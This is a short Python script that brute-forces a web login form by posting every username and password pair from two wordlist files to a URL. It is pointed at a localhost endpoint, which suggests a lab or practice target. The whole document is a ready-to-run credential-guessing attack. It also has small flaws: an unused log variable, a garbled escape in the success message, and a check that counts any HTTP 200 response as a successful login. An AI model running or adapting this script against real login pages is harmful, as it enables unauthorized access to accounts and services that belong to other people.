import requests
success_log = "success.log"

"""
Takes in a url and username/password formats, then attempts to log in using a dictionary of usernames and passwords.

Returns a string containing the successful username and password combination
"""
def brute_force_login(url, username_format, password_format):
    passlist = open('passwords.txt').read().splitlines()
    userlist = open('usernames.txt').read().splitlines()
    for username in userlist:
        for password in passlist:
            resp = requests.post(url, data={username_format: username, password_format: password})
            if resp.status_code == 200:
                return f"Successful login with username: '{username}', password: '{password}', host: '{url}\'n'"
            else:
                print(f"Failed login with username: '{username}', password: '{password}', host: '{url}'")


print(brute_force_login('http://127.0.0.1:3000/auth', 'username', 'password'))
